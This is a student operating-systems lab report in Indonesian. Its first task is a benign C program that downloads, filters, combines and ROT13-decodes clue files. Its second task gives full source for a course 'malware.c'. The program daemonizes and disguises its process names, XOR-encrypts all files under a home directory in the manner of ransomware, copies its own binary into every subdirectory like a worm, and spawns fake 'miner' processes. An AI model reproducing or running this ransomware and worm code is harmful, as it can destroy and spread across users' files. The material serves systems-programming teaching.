# Praktikum Sisop Modul 2-2025-IT15

Anggota kelompok : 
- Putu Yudi Nandanjaya Wiraguna	5027241080
- Naruna Vicranthyo Putra Gangga	5027241105
- Az Zahrra Tasya Adelia	        5027241087

# soal_1
### a) Downloading the Clues
pertama-tama kita membuat file action.c yang dimana kalau dijalankan tanpa argumen tambahan akan mendownload dan langsung meng unzip file tersebut. Dan tambahkan juga fungsi agar menghapus file Clues.zip setelah diekstrak dan semisal saat dijalankan folder Clues sudah ada, maka tidak akan mendownload Clues.zip lagi.
```C
void download_and_unzip() {
    if (access("Clues", F_OK) == 0) {
        printf("[!] Folder Clues sudah ada. Lewati download.\n");
        return;
    }

    pid_t pid = fork();
    if (pid == 0) {
        char *argv[] = {"wget", "--no-check-certificate", "-O", "Clues.zip",
                        "https://example.link.com/uc?id=example&export=download", NULL};
        execvp("wget", argv);
        perror("wget gagal");
        exit(1);
    } else {
        wait(NULL);
    }

    pid_t pid2 = fork();
    if (pid2 == 0) {
        char *argv[] = {"unzip", "Clues.zip", NULL};
        execvp("unzip", argv);
        perror("unzip gagal");
        exit(1);
    } else {
        wait(NULL);
    }

    remove("Clues.zip");
    printf("[+] Clues.zip berhasil diunduh dan diekstrak.\n");
}
```

### b) Filtering the Files
buatlah function filtering dengan memindahkan file-file yang hanya dinamakan dengan 1 huruf dan 1 angka tanpa karakter spesial kedalam folder baru bernama Filtered. Disaat filtering, file yang tidak dipindahkan kedalam folder Filtered akan dihapus.
```C
void filter_files() {
    mkdir("Filtered", 0755);

    const char *dirs[] = {"Clues/ClueA", "Clues/ClueB", "Clues/ClueC", "Clues/ClueD"};
    for (int i = 0; i < 4; i++) {
        DIR *d = opendir(dirs[i]);
        if (!d) {
            perror("Gagal membuka direktori");
            continue;
        }
        struct dirent *entry;
        while ((entry = readdir(d))) {
            if (is_valid_file(entry->d_name)) {
                char src[256], dst[256];
                snprintf(src, sizeof(src), "%s/%s", dirs[i], entry->d_name);
                snprintf(dst, sizeof(dst), "Filtered/%s", entry->d_name);
                rename(src, dst);
            } else {
                char path[256];
                snprintf(path, sizeof(path), "%s/%s", dirs[i], entry->d_name);
                remove(path);
            }
        }
        closedir(d);
    }
    printf("[*] Filtering selesai.\n");
}
```
Struktur dalam folder Filtered seharusnya terlihat seperti ini:
```
1.txt
2.txt
3.txt
4.txt
5.txt
6.txt
a.txt
b.txt
c.txt
d.txt
e.txt
f.txt
```

### c) Combine the File Content
kemudian buatlah function combine untuk meletakkan semua isi dari file .txt yang sudah difiltering sebelumnya kedalam file baru Combine.txt dengan menggunakan FILE pointer, tetapi file yang sebelumnya bernama angka diurut sesuai 1-2-3-..., dan huruf a-b-c-..., saat di combine: ambil dari file angka lalu huruf lalu angka lalu huruf dan seterusnya.
```C
int compare_numeric(const void *a, const void *b) {
    int num_a = atoi(*(const char **)a);
    int num_b = atoi(*(const char **)b);
    return num_a - num_b;
}

int compare_alpha(const void *a, const void *b) {
    return strcmp(*(const char **)a, *(const char **)b);
}

void combine_files() {
    DIR *dir = opendir("Filtered");
    if (!dir) {
        perror("Gagal membuka direktori Filtered");
        return;
    }

    struct dirent *entry;
    char *numbers[100], *letters[100];
    int num_count = 0, let_count = 0;

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) {
            if (strlen(entry->d_name) == 5 &&
                entry->d_name[1] == '.' &&
                entry->d_name[2] == 't' &&
                entry->d_name[3] == 'x' &&
                entry->d_name[4] == 't') {

                if (isdigit(entry->d_name[0])) {
                    numbers[num_count++] = strdup(entry->d_name);
                } else if (isalpha(entry->d_name[0])) {
                    letters[let_count++] = strdup(entry->d_name);
                }
            }
        }
    }
    closedir(dir);

    qsort(numbers, num_count, sizeof(char *), compare_numeric);
    qsort(letters, let_count, sizeof(char *), compare_alpha);

    FILE *out = fopen("Filtered/Combined.txt", "w");
    if (!out) {
        perror("Gagal membuat Combined.txt");
        return;
    }

    int max = num_count > let_count ? num_count : let_count;
    for (int i = 0; i < max; i++) {
        if (i < num_count) {
            char path[256];
            snprintf(path, sizeof(path), "Filtered/%s", numbers[i]);
            FILE *f = fopen(path, "r");
            if (f) {
                int ch;
                while ((ch = fgetc(f)) != EOF)
                    fputc(ch, out);
                fclose(f);
                remove(path);
            }
            free(numbers[i]);
        }
        if (i < let_count) {
            char path[256];
            snprintf(path, sizeof(path), "Filtered/%s", letters[i]);
            FILE *f = fopen(path, "r");
            if (f) {
                int ch;
                while ((ch = fgetc(f)) != EOF)
                    fputc(ch, out);
                fclose(f);
                remove(path);
            }
            free(letters[i]);
        }
    }


    fclose(out);
    printf("[*] Combined.txt berhasil dibuat dan file .txt lainnya dihapus.\n");
}
```

### d) Decode the file
lalu buatlah function decode untuk decode string dari Combine.txt menggunakan Rot13 dan letakkan hasilnya kedalam file Decoded.txt.
```C
char rot13(char c) {
    if ('a' <= c && c <= 'z') return 'a' + (c - 'a' + 13) % 26;
    if ('A' <= c && c <= 'Z') return 'A' + (c - 'A' + 13) % 26;
    return c;
}

void decode_file() {
    FILE *in = fopen("Filtered/Combined.txt", "r");
    FILE *out = fopen("Filtered/Decoded.txt", "w");
    if (!in || !out) {
        perror("Gagal membuka file untuk decode");
        return;
    }
    char c;
    while ((c = fgetc(in)) != EOF) {
        fputc(rot13(c), out);
    }
    fclose(in);
    fclose(out);
    printf("[*] File didecode ke Decoded.txt\n");
}
```

### e) Password Check
ini adalah bentuk final dari action.c:
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <dirent.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/wait.h>

void download_and_unzip() {
    if (access("Clues", F_OK) == 0) {
        printf("[!] Folder Clues sudah ada. Lewati download.\n");
        return;
    }

    pid_t pid = fork();
    if (pid == 0) {
        char *argv[] = {"wget", "--no-check-certificate", "-O", "Clues.zip",
                        "https://drive.google.com/uc?id=1xFn1OBJUuSdnApDseEczKhtNzyGekauK&export=download", NULL};
        execvp("wget", argv);
        perror("wget gagal");
        exit(1);
    } else {
        wait(NULL);
    }

    pid_t pid2 = fork();
    if (pid2 == 0) {
        char *argv[] = {"unzip", "Clues.zip", NULL};
        execvp("unzip", argv);
        perror("unzip gagal");
        exit(1);
    } else {
        wait(NULL);
    }

    remove("Clues.zip");
    printf("[+] Clues.zip berhasil diunduh dan diekstrak.\n");
}

int is_valid_file(const char *name) {
    return strlen(name) == 5 && isalnum(name[0]) && name[1] == '.' && name[2] == 't' && name[3] == 'x' && name[4] == 't';
}

void filter_files() {
    mkdir("Filtered", 0755);

    const char *dirs[] = {"Clues/ClueA", "Clues/ClueB", "Clues/ClueC", "Clues/ClueD"};
    for (int i = 0; i < 4; i++) {
        DIR *d = opendir(dirs[i]);
        if (!d) {
            perror("Gagal membuka direktori");
            continue;
        }
        struct dirent *entry;
        while ((entry = readdir(d))) {
            if (is_valid_file(entry->d_name)) {
                char src[256], dst[256];
                snprintf(src, sizeof(src), "%s/%s", dirs[i], entry->d_name);
                snprintf(dst, sizeof(dst), "Filtered/%s", entry->d_name);
                rename(src, dst);
            } else {
                char path[256];
                snprintf(path, sizeof(path), "%s/%s", dirs[i], entry->d_name);
                remove(path);
            }
        }
        closedir(d);
    }
    printf("[*] Filtering selesai.\n");
}

int compare_numeric(const void *a, const void *b) {
    int num_a = atoi(*(const char **)a);
    int num_b = atoi(*(const char **)b);
    return num_a - num_b;
}

int compare_alpha(const void *a, const void *b) {
    return strcmp(*(const char **)a, *(const char **)b);
}

void combine_files() {
    DIR *dir = opendir("Filtered");
    if (!dir) {
        perror("Gagal membuka direktori Filtered");
        return;
    }

    struct dirent *entry;
    char *numbers[100], *letters[100];
    int num_count = 0, let_count = 0;

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) {
            if (strlen(entry->d_name) == 5 &&
                entry->d_name[1] == '.' &&
                entry->d_name[2] == 't' &&
                entry->d_name[3] == 'x' &&
                entry->d_name[4] == 't') {

                if (isdigit(entry->d_name[0])) {
                    numbers[num_count++] = strdup(entry->d_name);
                } else if (isalpha(entry->d_name[0])) {
                    letters[let_count++] = strdup(entry->d_name);
                }
            }
        }
    }
    closedir(dir);

    qsort(numbers, num_count, sizeof(char *), compare_numeric);
    qsort(letters, let_count, sizeof(char *), compare_alpha);

    FILE *out = fopen("Filtered/Combined.txt", "w");
    if (!out) {
        perror("Gagal membuat Combined.txt");
        return;
    }

    int max = num_count > let_count ? num_count : let_count;
    for (int i = 0; i < max; i++) {
        if (i < num_count) {
            char path[256];
            snprintf(path, sizeof(path), "Filtered/%s", numbers[i]);
            FILE *f = fopen(path, "r");
            if (f) {
                int ch;
                while ((ch = fgetc(f)) != EOF)
                    fputc(ch, out);
                fclose(f);
                remove(path);
            }
            free(numbers[i]);
        }
        if (i < let_count) {
            char path[256];
            snprintf(path, sizeof(path), "Filtered/%s", letters[i]);
            FILE *f = fopen(path, "r");
            if (f) {
                int ch;
                while ((ch = fgetc(f)) != EOF)
                    fputc(ch, out);
                fclose(f);
                remove(path);
            }
            free(letters[i]);
        }
    }


    fclose(out);
    printf("[*] Combined.txt berhasil dibuat dan file .txt lainnya dihapus.\n");
}


char rot13(char c) {
    if ('a' <= c && c <= 'z') return 'a' + (c - 'a' + 13) % 26;
    if ('A' <= c && c <= 'Z') return 'A' + (c - 'A' + 13) % 26;
    return c;
}

void decode_file() {
    FILE *in = fopen("Filtered/Combined.txt", "r");
    FILE *out = fopen("Filtered/Decoded.txt", "w");
    if (!in || !out) {
        perror("Gagal membuka file untuk decode");
        return;
    }
    char c;
    while ((c = fgetc(in)) != EOF) {
        fputc(rot13(c), out);
    }
    fclose(in);
    fclose(out);
    printf("[*] File didecode ke Decoded.txt\n");
}

int main(int argc, char *argv[]) {
    if (argc == 1) {
        download_and_unzip();
    } else if (argc == 3 && strcmp(argv[1], "-m") == 0) {
        if (strcmp(argv[2], "Filtered") == 0) {
            filter_files();
        } else if (strcmp(argv[2], "Combine") == 0) {
            combine_files();
        } else if (strcmp(argv[2], "Decode") == 0) {
            decode_file();
        } else {
            fprintf(stderr, "Argumen tidak dikenali.\n");
            return 1;
        }
    } else {
        fprintf(stderr, "Usage:\n");
        fprintf(stderr, "  ./action              # untuk download Clues.zip\n");
        fprintf(stderr, "  ./action -m Filtered  # untuk filter file\n");
        fprintf(stderr, "  ./action -m Combine   # untuk gabungkan file\n");
        fprintf(stderr, "  ./action -m Decode    # untuk decode ROT13\n");
        return 1;
    }
    return 0;
}
```
setelah melakukan semuanya, kita mendapatkan password untuk di input ke cyrus
![image](https://github.com/user-attachments/assets/228f7f14-99c1-42d4-9d32-63fe078be647)

kendala: tidak ada

screenshot saat ./action:

![Screenshot 2025-04-17 195551](https://github.com/user-attachments/assets/226cda16-b223-41c2-a88a-be929c8d8f8d)

screenshot saat ./action -m Filtered:

![Screenshot 2025-04-17 195626](https://github.com/user-attachments/assets/44a486a4-c71a-4552-8942-ec8f763275ce)

screenshot saat ./action -m Combine:

![Screenshot 2025-04-17 195700](https://github.com/user-attachments/assets/fb71f9eb-8f19-4cd0-9792-2cf17184e20b)

screenshot saat ./action -m Decode:

![Screenshot 2025-04-17 195729](https://github.com/user-attachments/assets/d00ab73e-aed8-4d01-80fd-37574bb09592)

# Soal_3
### a)
Buatlah malware.c yang akan bekerja secara daemon dan mengubah namanya menjadi /init.
```C
void create_daemon() {
    pid_t pid, sid;

    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    umask(0);

    sid = setsid();
    if (sid < 0) exit(EXIT_FAILURE);

    if ((chdir("/")) < 0) exit(EXIT_FAILURE);

    for (int x = sysconf(_SC_OPEN_MAX); x >= 0; x--) {
        close(x);
    }
}

void menyamarkan_process(int argc, char **argv) {
    environ = NULL;
    prctl(PR_SET_NAME, "/soal_3", 0, 0, 0);

    if (argc > 0) {
        size_t len = 64;
        memset(argv[0], 0, len);
        strncpy(argv[0], "/soal_3", len);
    }
}
```
### b)
Lalu buatlah anak fitur pertama yang akan memindai directory saat ini dan mengenkripsi file dan folder menggunakan xor dengan timestamp saat dijalankan.
```C
void child_1(int argc, char **argv) {
    pid_t child = fork();
    if (child < 0) exit(EXIT_FAILURE);
    if (child == 0) {
        prctl(PR_SET_NAME, "encryptor", 0, 0, 0);

        if (argc > 0) {
            size_t len = 64;
            memset(argv[0], 0, len);
            strncpy(argv[0], "encryptor", len);
        }

        unsigned int key = (unsigned int)time(NULL);
        while (1) {
            encrypt("/home/isolate", key);
        }
        exit(EXIT_SUCCESS);
    }
}
```
### c)
Setelah itu buat anak fitur kedua yang akan menyebarkan malware ini dengan cara membuat salinan binary malware di setiap directory yang ada di home.
```C
void child_2(int argc, char **argv) {
    pid_t child = fork();
    if (child < 0) exit(EXIT_FAILURE);
    if (child == 0) {
        prctl(PR_SET_NAME, "trojan.wrm", 0, 0, 0);

        if (argc > 0) {
            size_t len = 64;
            memset(argv[0], 0, len);
            strncpy(argv[0], "trojan.wrm", len);
        }

        while (1) {
            copy_self_recursive("/home/target");
        }
        exit(EXIT_SUCCESS);
    }
}
```
### d)
Anak fitur pertama dan kedua harus berjalan berulang ulang dengan interval 30 detik.
```C
// Kedua child ditambahkan sleep(30) agar ada interval
void child_1(int argc, char **argv) {
    pid_t child = fork();
    if (child < 0) exit(EXIT_FAILURE);
    if (child == 0) {
        prctl(PR_SET_NAME, "encryptor", 0, 0, 0);

        if (argc > 0) {
            size_t len = 64;
            memset(argv[0], 0, len);
            strncpy(argv[0], "encryptor", len);
        }

        unsigned int key = (unsigned int)time(NULL);
        while (1) {
            encrypt("/home/isolate", key);
            sleep(30);
        }
        exit(EXIT_SUCCESS);
    }
}

void child_2(int argc, char **argv) {
    pid_t child = fork();
    if (child < 0) exit(EXIT_FAILURE);
    if (child == 0) {
        prctl(PR_SET_NAME, "trojan.wrm", 0, 0, 0);

        if (argc > 0) {
            size_t len = 64;
            memset(argv[0], 0, len);
            strncpy(argv[0], "trojan.wrm", len);
        }

        while (1) {
            copy_self_recursive("/home/target");
            sleep(30);
        }
        exit(EXIT_SUCCESS);
    }
}
```
### e)
Tambahkan anak fitur ketiga yang akan membuat sebuah fork bomb di dalam perangkat.
```C
void child_3(int argc, char **argv) {
    pid_t rodok = fork();
    if (rodok < 0) exit(EXIT_FAILURE);
    if (rodok == 0) {
        prctl(PR_SET_NAME, "rodok.exe", 0, 0, 0);

        if (argc > 0) {
            size_t len = 64;
            memset(argv[0], 0, len);
            strncpy(argv[0], "rodok.exe", len);
        }

        srand(time(NULL));
        int max_miner = sysconf(_SC_NPROCESSORS_ONLN);
        if (max_miner < 3) max_miner = 3;

        for (int i = 0; i < max_miner; i++) {
            pid_t miner = fork();
            if (miner == 0) {
                mine_worker(i, argc, argv);
                exit(EXIT_SUCCESS);
            }
        }

        while (1) sleep(60);
        exit(EXIT_SUCCESS);
    }
}
```
### f)
Setelah itu tambahkan fitur pada fork bomb tadi dimana setiap fork dinamakan mine-crafter-XX dan akan melakukan cryptomining(cryptomining yang dimaksud adalah membuat sebuah hash hexadecimal (base 16) random sepanjang 64 char). Masing masing hash dibuat secara random dalam rentang waktu 3 detik - 30 detik.
```C
char *generate_hash() {
    static char charset[] = "0123456789abcdef";
    static char hash[65];
    for (int i = 0; i < 64; i++) {
        hash[i] = charset[rand() % 16];
    }
    hash[64] = '\0';
    return hash;
}

void mine_worker(int id, int argc, char **argv) {
  prctl(PR_SET_PDEATHSIG, SIGTERM);

  char procname[64];
  snprintf(procname, sizeof(procname), "mine-crafter-%d", id);
  prctl(PR_SET_NAME, procname, 0, 0, 0);

  if (argc > 0) {
      size_t len = 64;
      memset(argv[0], 0, len);
      strncpy(argv[0], procname, len);
  }

// Seed unik untuk setiap worker
  srand(time(NULL) ^ (getpid() + id));

  while (1) {
      int delay = (rand() % 28) + 3;
      sleep(delay);

      time_t now = time(NULL);
      struct tm *t = localtime(&now);

      char logline[128];
      snprintf(logline, sizeof(logline), "[%04d-%02d-%02d %02d:%02d:%02d][Miner %02d] %s\n",
               t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
               t->tm_hour, t->tm_min, t->tm_sec,
               id, generate_hash());

      }
  }
}
```
### g)
mine-crafter-XX akan mengumpulkan hash yang sudah dibuat dan menyimpannya di dalam file /tmp/.miner.log
```C
void mine_worker(int id, int argc, char **argv) {
  prctl(PR_SET_PDEATHSIG, SIGTERM);

  char procname[64];
  snprintf(procname, sizeof(procname), "mine-crafter-%d", id);
  prctl(PR_SET_NAME, procname, 0, 0, 0);

  if (argc > 0) {
      size_t len = 64;
      memset(argv[0], 0, len);
      strncpy(argv[0], procname, len);
  }

  srand(time(NULL) ^ (getpid() + id)); 

  while (1) {
      int delay = (rand() % 28) + 3;
      sleep(delay);

      time_t now = time(NULL);
      struct tm *t = localtime(&now);

      char logline[128];
      snprintf(logline, sizeof(logline), "[%04d-%02d-%02d %02d:%02d:%02d][Miner %02d] %s\n",
               t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
               t->tm_hour, t->tm_min, t->tm_sec,
               id, generate_hash());

//Output dari mine-crafter-XX akan disimpan di file /tmp/.miner.log
      FILE *log = fopen("/tmp/.miner.log", "a");
      if (log) {
          fputs(logline, log);
          fclose(log);
      }
  }
}
```
### h)
Terakhir, tambahkan fitur dimana jika rodok.exe dimatikan, maka seluruh mine-crafter-XX juga akan mati.

#### Struktur akhir dari malware.c
```C
#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <syslog.h>
#include <string.h>
#include <sys/prctl.h>
#include <time.h>
#include <dirent.h>
#include <limits.h>
#include <signal.h>

extern char **environ;

void create_daemon() {
    pid_t pid, sid;

    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    umask(0);

    sid = setsid();
    if (sid < 0) exit(EXIT_FAILURE);

    if ((chdir("/")) < 0) exit(EXIT_FAILURE);

    for (int x = sysconf(_SC_OPEN_MAX); x >= 0; x--) {
        close(x);
    }
}

void menyamarkan_process(int argc, char **argv) {
    environ = NULL;
    prctl(PR_SET_NAME, "/soal_3", 0, 0, 0);

    if (argc > 0) {
        size_t len = 64;
        memset(argv[0], 0, len);
        strncpy(argv[0], "/soal_3", len);
    }
}

void xorfile(const char *filename, unsigned int key) {
    char tmp_filename[512];
    snprintf(tmp_filename, sizeof(tmp_filename), "%s.tmp", filename);

    FILE *in = fopen(filename, "rb");
    FILE *out = fopen(tmp_filename, "wb");

    if (!in || !out) {
        perror("File error");
        if (in) fclose(in);
        if (out) fclose(out);
        return;
    }

    int ch;
    while ((ch = fgetc(in)) != EOF) {
        fputc(ch ^ key, out);
    }

    fclose(in);
    fclose(out);

    remove(filename);
    rename(tmp_filename, filename);
}

void encrypt(const char *path, unsigned int key) {
    DIR *dir = opendir(path);
    if (!dir) return;

    struct dirent *entry;
    char fullpath[1024];

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);

        struct stat st;
        if (stat(fullpath, &st) == -1) continue;

        if (S_ISDIR(st.st_mode)) {
            encrypt(fullpath, key);
        } else if (S_ISREG(st.st_mode)) {
            xorfile(fullpath, key);
        }
    }
    closedir(dir);
}

void copy_self_recursive(const char *dirpath) {
    DIR *dir = opendir(dirpath);
    if (!dir) return;

    struct dirent *entry;
    char path[PATH_MAX];

    char exe_path[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    if (len == -1) {
        perror("readlink");
        closedir(dir);
        return;
    }
    exe_path[len] = '\0';

    const char *filename = strrchr(exe_path, '/');
    filename = filename ? filename + 1 : exe_path;

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        snprintf(path, sizeof(path), "%s/%s", dirpath, entry->d_name);

        struct stat st;
        if (stat(path, &st) == -1) continue;

        if (S_ISDIR(st.st_mode)) {
            copy_self_recursive(path);
        }
    }

    char target_path[PATH_MAX];
    snprintf(target_path, sizeof(target_path), "%s/%s", dirpath, filename);

    FILE *src = fopen(exe_path, "rb");
    FILE *dest = fopen(target_path, "wb");

    if (!src || !dest) {
        perror("copy error");
        if (src) fclose(src);
        if (dest) fclose(dest);
        closedir(dir);
        return;
    }

    char buffer[4096];
    size_t n;
    while ((n = fread(buffer, 1, sizeof(buffer), src)) > 0) {
        fwrite(buffer, 1, n, dest);
    }

    fclose(src);
    fclose(dest);
    closedir(dir);
}

char *generate_hash() {
    static char charset[] = "0123456789abcdef";
    static char hash[65];
    for (int i = 0; i < 64; i++) {
        hash[i] = charset[rand() % 16];
    }
    hash[64] = '\0';
    return hash;
}

void mine_worker(int id, int argc, char **argv) {
  prctl(PR_SET_PDEATHSIG, SIGTERM);

  char procname[64];
  snprintf(procname, sizeof(procname), "mine-crafter-%d", id);
  prctl(PR_SET_NAME, procname, 0, 0, 0);

  if (argc > 0) {
      size_t len = 64;
      memset(argv[0], 0, len);
      strncpy(argv[0], procname, len);
  }

  srand(time(NULL) ^ (getpid() + id));

  while (1) {
      int delay = (rand() % 28) + 3;
      sleep(delay);

      time_t now = time(NULL);
      struct tm *t = localtime(&now);

      char logline[128];
      snprintf(logline, sizeof(logline), "[%04d-%02d-%02d %02d:%02d:%02d][Miner %02d] %s\n",
               t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
               t->tm_hour, t->tm_min, t->tm_sec,
               id, generate_hash());

      FILE *log = fopen("/tmp/.miner.log", "a");
      if (log) {
          fputs(logline, log);
          fclose(log);
      }
  }
}


void child_1(int argc, char **argv) {
    pid_t child = fork();
    if (child < 0) exit(EXIT_FAILURE);
    if (child == 0) {
        prctl(PR_SET_NAME, "encryptor", 0, 0, 0);

        if (argc > 0) {
            size_t len = 64;
            memset(argv[0], 0, len);
            strncpy(argv[0], "encryptor", len);
        }

        unsigned int key = (unsigned int)time(NULL);
        while (1) {
            encrypt("/home/isolate", key);
            sleep(30);
        }
        exit(EXIT_SUCCESS);
    }
}

void child_2(int argc, char **argv) {
    pid_t child = fork();
    if (child < 0) exit(EXIT_FAILURE);
    if (child == 0) {
        prctl(PR_SET_NAME, "trojan.wrm", 0, 0, 0);

        if (argc > 0) {
            size_t len = 64;
            memset(argv[0], 0, len);
            strncpy(argv[0], "trojan.wrm", len);
        }

        while (1) {
            copy_self_recursive("/home/target");
            sleep(30);
        }
        exit(EXIT_SUCCESS);
    }
}

void child_3(int argc, char **argv) {
    pid_t rodok = fork();
    if (rodok < 0) exit(EXIT_FAILURE);
    if (rodok == 0) {
        prctl(PR_SET_NAME, "rodok.exe", 0, 0, 0);

        if (argc > 0) {
            size_t len = 64;
            memset(argv[0], 0, len);
            strncpy(argv[0], "rodok.exe", len);
        }

        srand(time(NULL));
        int max_miner = sysconf(_SC_NPROCESSORS_ONLN);
        if (max_miner < 3) max_miner = 3;

        for (int i = 0; i < max_miner; i++) {
            pid_t miner = fork();
            if (miner == 0) {
                mine_worker(i, argc, argv);
                exit(EXIT_SUCCESS);
            }
        }

        while (1) sleep(60);
        exit(EXIT_SUCCESS);
    }
}

int main(int argc, char *argv[]) {
    create_daemon();
    menyamarkan_process(argc, argv);
    child_1(argc, argv);
    child_2(argc, argv);
    child_3(argc, argv);
    while (1) {
        sleep(60);
    }
    return 0;
}
```
